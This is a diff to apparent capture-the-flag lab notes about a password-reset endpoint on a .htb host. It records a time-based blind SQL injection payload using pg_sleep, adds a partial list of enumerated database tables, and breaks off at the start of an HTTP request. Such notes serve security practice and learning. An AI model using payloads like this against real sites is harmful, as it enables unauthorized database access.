@@ -3,6 +3,13 @@
 ## SQLI AT https://www.royalflush.htb/forgot
 payload `asd%40me.c'||+(SELECT+pg_sleep(10)::text)||'`
 
+tables:
+| user    |
+| user_r? |
+| forgot  |
+| roles  
+
+
 ### Request 
 ```POST /forgot HTTP/1.1
 Host: www.royalflush.htb
